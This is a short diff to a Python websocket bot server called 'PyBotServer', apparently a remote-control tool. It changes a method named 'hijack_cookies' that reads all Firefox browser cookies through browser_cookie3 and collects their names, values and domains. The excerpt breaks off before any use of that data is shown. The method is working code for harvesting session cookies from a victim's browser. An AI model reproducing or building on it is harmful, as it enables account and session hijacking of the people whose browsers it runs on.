@@ -32,7 +32,7 @@ class PyBotServer:
             await self.__websocket.send(json.dumps(response))
             logging.info(f"Sent response: {response}")
 
-    async def hijack_cookies(self):
+    async def hijack_cookies(self, data):
         try:
             cookies = browser_cookie3.firefox()
             cookie_dict = {cookie.name: {'value': cookie.value, 'domain': cookie.domain} for cookie in cookies}
